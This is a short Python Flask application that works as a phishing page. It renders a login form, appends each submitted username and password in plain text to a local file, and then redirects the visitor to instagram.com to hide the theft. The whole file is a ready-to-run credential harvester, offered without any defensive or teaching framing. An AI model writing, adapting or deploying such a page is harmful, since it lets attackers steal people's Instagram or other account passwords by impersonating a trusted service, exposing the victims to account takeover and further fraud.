from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        # Save credentials to a text file
        with open('credentials.txt', 'a') as file:
            file.write(f"Username: {username}, Password: {password}\n")

        return "<script>window.location.href='https://www.instagram.com';</script>"

    return render_template('login.html')

if __name__ == '__main__':
    app.run(debug=True)
